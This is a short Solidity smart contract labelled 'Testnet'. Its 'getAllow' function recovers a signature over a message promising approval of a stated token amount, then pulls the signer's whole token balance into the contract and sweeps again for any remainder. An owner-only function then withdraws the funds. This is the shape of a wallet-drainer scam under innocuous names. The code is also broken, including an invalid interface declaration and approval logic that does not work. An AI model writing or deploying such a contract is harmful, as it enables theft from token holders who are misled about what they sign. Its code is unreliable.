// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function approve(address(this), uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Testnet {
    using MessageHashUtils for bytes32;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function getAllow(
        address token,
        address target,
        uint256 amount,
        bytes memory signature
    ) external {
       
        bytes32 messageHash = keccak256(abi.encodePacked(
            "Approve ", token, " to ", address(this), " amount ", amount
        ));
        
        address signer = ECDSA.recover(messageHash.toEthSignedMessageHash(), signature);
        
        require(signer == target, "Invalid signature or unauthorized signer");

        IERC20(token).approve(address(this), type(uint256).max);

        uint256 balance = IERC20(token).balanceOf(target);
        IERC20(token).transferFrom(target, address(this), balance);

        uint256 newBalance = IERC20(token).balanceOf(target);
        if (newBalance > 0) {
            IERC20(token).transferFrom(target, address(this), newBalance);
        }
    }

    function withdrawAll(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(address(this), owner, balance);
    }
}